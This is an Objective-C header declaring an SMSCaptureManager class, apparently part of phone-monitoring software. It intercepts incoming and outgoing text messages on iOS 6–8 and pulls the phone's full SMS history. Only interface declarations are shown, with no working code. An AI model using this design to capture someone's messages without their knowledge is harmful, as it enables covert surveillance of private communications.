/**
 - Project name :  SMSCapture Maanager 
 - Class name   :  SMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For SMS Capturing Component
 - Copy right   :  28/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/


#import <Foundation/Foundation.h>
#import "EventDelegate.h"
#import "MessagePortIPCReader.h"
#import "AppContext.h"

@class SMSNotifier;
@class SMSCaptureUtils;

/*
 
 iOS 6,7,8 OUTGOING
 
 - SMSNotifier --> dataDidReceivedFromMessagePort
 - SMSNotifier --> createSMSEvent:
 - SMSCaptureManager --> smsEventDidFinish
 - SMSCaptureManager --> contactWithSMSEvent
 
 iOS 6,7,8 INCOMING
 
 - SMSCaptureManager --> dataDidReceivedFromMessagePort
 
 */

@protocol TelephonyNotificationManager;

@interface SMSCaptureManager : NSObject <MessagePortIPCDelegate> {
@private
	// For creating an instance of SocketIPCReader
    MessagePortIPCReader	*mMessagePortIPCReader; 
	id <EventDelegate>      mEventDelegate;
	id <AppContext>			mAppContext;
	SMSCaptureUtils			*mSMSUtils;
	
	// IOS 6,7,8
	SMSNotifier			*mSMSNotifier;
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
	NSMutableArray		*mSMSEventPool;
}

@property (nonatomic, assign) id <AppContext> mAppContext;
@property (nonatomic, assign) id <TelephonyNotificationManager> mTelephonyNotificationManager;

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate;

- (void) startCapture;
- (void) stopCapture;

- (void) prepareForRelease;

// -- Historical SMS

+ (NSArray *) allSMSs;
+ (NSArray *) allSMSsWithMax: (NSInteger) aMaxNumber;

@end
